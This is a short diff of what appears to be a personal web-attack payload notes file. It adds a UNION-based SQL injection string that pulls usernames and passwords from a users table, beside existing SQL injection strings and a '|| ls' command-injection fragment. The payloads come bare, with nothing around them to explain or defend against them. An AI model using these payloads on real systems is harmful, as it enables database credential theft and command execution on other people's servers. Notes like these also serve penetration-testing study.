@@ -23,7 +23,7 @@ SELECT name, type FROM USERS WHERE name LIKE "%1"; SELECT * FROM USERS WHERE "%"
 || ls
 
 '+UNION+SELECT+username,+password+FROM+users--
-
+'+UNION+SELECT+NULL,username||'~'||password+FROM+users--
 
 CORS
 
